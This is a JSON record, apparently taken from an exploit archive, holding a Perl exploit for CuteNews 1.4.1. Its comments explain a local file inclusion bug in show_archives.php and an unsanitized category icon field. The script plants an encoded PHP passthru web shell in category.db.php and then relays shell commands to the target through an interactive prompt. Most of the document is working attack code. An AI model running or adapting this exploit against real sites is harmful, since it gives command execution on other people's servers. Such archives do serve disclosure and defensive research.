{
  "id": "1400",
  "title": "CuteNews 1.4.1 - &#039;categories.mdu&#039; Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# cijfer-cnxpl - CuteNews <=1.4.1 Remote Command Execution\r\n#\r\n# Copyright (c) 2005 cijfer <cijfer@netti.fi>\r\n# All rights reserved.           \r\n#\r\n## 1. example\r\n#\r\n# [cijfer@kalma:/research]$ ./cijfer-cnxpl.pl -h www.xxxx.org -d /news\r\n# [cijfer@www.xxxx.org /]$ id;uname -a\r\n# uid=48(apache) gid=48(apache) groups=48(apache),29000(web_serving) context=root:system_r:httpd_sys_script_t\r\n# Linux server.xxxx.org 2.6.13-1.1532_FC4 #1 Thu Oct 20 01:30:08 EDT 2005 i686 i686 i386 GNU/Linux\r\n# [cijfer@www.xxxx.org /]$\r\n#\r\n## 2. explanation\r\n#\r\n# this particular vulnerability is already known (sort of). a\r\n# bug as exact as this one was found by rgod in CuteNews. the\r\n# sole difference between his and my bug, are the files that\r\n# are being exploited. while his was a bug using the following\r\n# string:\r\n#\r\n#\tshow_archives.php?template=../inc/ipban.mdu%00\r\n#\r\n# i found my bug in:\r\n#\r\n#\tshow_archives.php?template=../inc/categories.mdu%00\r\n#\r\n## 3. the bug\r\n#\r\n# the bug lies in categories.mdu, located in the /inc/ folder\r\n# of the cutenews directory.\r\n#\r\n# by using the 'template' variable in show_archives.php, we\r\n# can include any local files. in this case, we're including\r\n# categories.mdu. why? every .mdu file within the cutenews \r\n# package has raw PHP code within it, that is not protected\r\n# like the normal .php files.\r\n#\r\n# $template gets sanitized, but can be bypassed depending on\r\n# php configuration! this is why on some 1.4.0's it works and\r\n# on some others it does not. it all depends on configuration\r\n# and whether or not register_globals needs to be on.\r\n#\r\n# \tif(file_exists(\"$cutepath/data/${template}.tpl\")){ require(\"$cutepath/data/${template}.tpl\"); }\r\n#       ...\r\n#\r\n# looking into categories.mdu, we notice the following to\r\n# create our exploit string:\r\n#\r\n# \tif($member_db[1] != 1){ msg(\"error\", \"Access Denied\", \"You don't have permission to edit categories\"); }\r\n#       ... \r\n#\r\n#\telseif($action == \"doedit\")\r\n# \t{\r\n#       ...\r\n#\r\n# cannot write arbitrary php code to $cat_name :(\r\n#\r\n#\t$cat_name = htmlspecialchars(stripslashes($cat_name)); \r\n#       ...\r\n#\r\n# $cat_icon lacks sanitization :))!\r\n#\r\n#\tfwrite($new_cats, \"$catid|$cat_name|$cat_icon|||\\n\");\r\n#       ...\r\n#\r\n# adding together all these elements, it is possible to inject\r\n# php code into data/category.db.php and from there, use our\r\n# injected code to either include a remote php shell, or run\r\n# commands on the system.\r\n#\r\n##\r\n#\r\n# $Id: cijfer-cnxpl.pl,v 0.2 2005/12/26 03:36:00 cijfer Exp cijfer $\r\n\r\nuse IO::Socket;\r\nuse Getopt::Std;\r\nuse URI::Escape;\r\n\r\ngetopts(\"h:d:\");\r\n\r\n$host = $opt_h;\r\n$dirs = $opt_d;\r\n$good = 0;\r\n\r\nif(!$host)\r\n{\r\n\tprint \"cijfer-cnxpl.pl by cijfer\\n\";\r\n        print \"usage: $0 -h <hostname> -d [/directory]\\r\\n\";\r\n        exit();\r\n}\r\n\r\nwhile()\r\n{\r\n\tprint \"[cijfer@\".$host.\" /]\\$ \";\r\n\twhile(<STDIN>)\r\n\t{\r\n\t\t$cmds=$_;\r\n\t\tchomp($cmds);\r\n\t\tlast;\r\n\t}\r\n\r\nif(!$dirs)\r\n{\r\n\t$dirs = \"/cutenews\";\r\n}\r\n\r\n$string  = $dirs;\r\n$string .= \"/show_archives.php?template=../inc/categories.mdu%00\";\r\n$string .= \"&member_db[1]=1\";\r\n$string .= \"&action=doedit\";                                #can be changed from 'doedit' to 'add' if no categories exist\r\n$string .= \"&cat_name=cijfer\";\r\n$string .= \"&catid=1\";                                      #can be changed to different value if starting catid != 0\r\n$string .= \"&cat_icon=%3C%3Fpassthru%28%24_GET%5Bcij%5D%29%3Bdie%28%29%3B%3F%3E\";\r\n\r\n$cijfer  = $dirs;\r\n$cijfer .= \"/data/category.db.php?cij=\";\r\n$cijfer .= uri_escape(\"echo; \");\r\n$cijfer .= \"%20%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20\"; # _START_\r\n$cijfer .= uri_escape($cmds);\r\n$cijfer .= \"%3B%20%65%63%68%6F%20%5F%45%4E%44%5F\";          # _END_\r\n\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => 80) || die \"error: connect()\\n\";\r\n\r\nprint $sock \"GET $string HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\n\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => 80) || die \"error: connect()\\n\";\r\n\r\nprint $sock \"GET $cijfer HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\n\r\nwhile($result = <$sock>)\r\n{\r\n\tif($sock =~ /^403/)\r\n\t{\r\n\t\tprint \"error: 403\\n\";\r\n\t\texit();\r\n\t}\r\n\tif($result =~ /^_END_/)\r\n\t{\r\n\t\t$good=0;\r\n\t}\r\n\r\n\tif($good==1)\r\n\t{\r\n        \tprint $result;\r\n\t}\r\n\r\n\tif($result =~ /^_START_/)\r\n\t{\r\n\t\t$good=1;\r\n\t}\r\n}\r\n}\r\n\r\n# milw0rm.com [2006-01-01]",
  "url": "https://www.exploit-db.com/exploits/1400"
}